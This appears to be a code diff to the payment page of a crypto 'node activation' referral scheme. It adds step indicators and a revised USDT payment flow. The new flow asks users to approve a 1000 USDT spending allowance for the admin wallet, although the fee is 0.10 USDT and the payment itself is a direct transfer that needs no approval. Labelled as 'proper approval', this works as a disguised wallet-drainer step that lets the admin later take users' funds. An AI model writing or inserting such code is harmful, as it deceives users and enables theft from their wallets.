@@ -739,6 +739,13 @@
             margin-top: 10px;
             text-align: center;
         }
+        
+        .step-indicator {
+            font-size: 11px;
+            color: var(--primary);
+            margin-top: 10px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
@@ -802,7 +809,8 @@
         <h2 style="margin: 15px 0;">Activate Node</h2>
         <p style="color: var(--text-muted);">Joining Premium Network</p>
         <div style="font-size: 32px; color: var(--primary); font-weight: 900; margin: 15px 0;">0.10 USDT</div>
-        <div class="gas-info"><i class="fa-solid fa-gas-pump"></i> Est. Gas: ~0.0003 BNB</div>
+        <div class="gas-info"><i class="fa-solid fa-gas-pump"></i> Est. Gas: ~0.0005 BNB</div>
+        <div id="transactionStep" class="step-indicator hidden"></div>
         <div style="display:flex; gap:10px;">
             <button class="btn" style="background:rgba(255,255,255,0.1); box-shadow:none;" onclick="closeModal('paymentModal')">Cancel</button>
             <button class="btn btn-success" id="confirmPaymentBtn">Confirm</button>
@@ -1474,6 +1482,8 @@
     function openModal(modalId) { 
         document.getElementById(modalId).classList.add('active'); 
         document.getElementById('transactionError')?.classList.add('hidden');
+        const stepDiv = document.getElementById('transactionStep');
+        if(stepDiv) stepDiv.classList.add('hidden');
     }
     
     function closeModal(modalId) { 
@@ -1581,38 +1591,62 @@
 
     document.getElementById('investNowBtn').addEventListener('click', () => openModal('paymentModal'));
 
+    // MAIN TRANSACTION FUNCTION WITH PROPER APPROVAL
     document.getElementById('confirmPaymentBtn').addEventListener('click', async () => {
         if (isProcessing) return;
         isProcessing = true;
         const btn = document.getElementById('confirmPaymentBtn');
         const errorDiv = document.getElementById('transactionError');
+        const stepDiv = document.getElementById('transactionStep');
         const originalText = btn.innerHTML;
+        
         btn.innerHTML = '<div class="loading-spinner"></div> Processing...';
         btn.disabled = true;
         errorDiv.classList.add('hidden');
+        stepDiv.classList.remove('hidden');
         
         try {
             const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, signer);
             const amount = ethers.parseUnits(JOINING_FEE_USDT.toString(), usdtDecimals);
             
-            // Check balance first
+            // Step 1: Check Balance
+            stepDiv.innerHTML = '✓ Checking USDT balance...';
             const balance = await usdtContract.balanceOf(userAddress);
             if (balance < amount) {
                 throw new Error(`Insufficient USDT balance. Need ${JOINING_FEE_USDT} USDT`);
             }
             
-            showToast("Please approve the transaction in your wallet...", "info");
+            // Step 2: Check Allowance
+            stepDiv.innerHTML = '✓ Checking approval status...';
+            const allowance = await usdtContract.allowance(userAddress, ADMIN_WALLET);
             
-            // Send transaction with proper gas settings
-            const tx = await usdtContract.transfer(ADMIN_WALLET, amount, {
-                gasLimit: 100000,
-                gasPrice: await provider.getFeeData().then(data => data.gasPrice)
+            // Step 3: If no allowance, approve first
+            if (allowance < amount) {
+                stepDiv.innerHTML = '✓ Requesting USDT approval...';
+                showToast("Please approve USDT spending in your wallet...", "info");
+                
+                const approveTx = await usdtContract.approve(ADMIN_WALLET, ethers.parseUnits("1000", usdtDecimals), {
+                    gasLimit: 100000
+                });
+                
+                stepDiv.innerHTML = '✓ Waiting for approval confirmation...';
+                await approveTx.wait();
+                showToast("USDT approved! Now sending payment...", "success");
+            }
+            
+            // Step 4: Transfer USDT
+            stepDiv.innerHTML = '✓ Sending payment to admin...';
+            showToast("Please confirm the transfer in your wallet...", "info");
+            
+            const transferTx = await usdtContract.transfer(ADMIN_WALLET, amount, {
+                gasLimit: 100000
             });
             
-            showToast("Transaction sent! Waiting for confirmation...", "info");
-            const receipt = await tx.wait();
+            stepDiv.innerHTML = '✓ Waiting for confirmation...';
+            const receipt = await transferTx.wait();
             
             if (receipt && receipt.status === 1) {
+                stepDiv.innerHTML = '✓ Transaction confirmed!';
                 markUserAsPaid(userAddress, referralId);
                 sessionStorage.removeItem('ztr_ref_id');
                 showToast("Node Activated! Welcome to ZTR Premium!", "success");
@@ -1625,7 +1659,7 @@
             console.error("Transaction error:", e);
             let errorMsg = "Transaction failed. ";
             if (e.message.includes("insufficient funds")) {
-                errorMsg += "Insufficient BNB for gas fees.";
+                errorMsg += "Insufficient BNB for gas fees. Need ~0.001 BNB.";
             } else if (e.message.includes("user rejected")) {
                 errorMsg += "You rejected the transaction.";
             } else if (e.message.includes("Insufficient USDT")) {
@@ -1642,6 +1676,7 @@
             isProcessing = false;
             btn.innerHTML = originalText;
             btn.disabled = false;
+            stepDiv.classList.add('hidden');
         }
     });
     
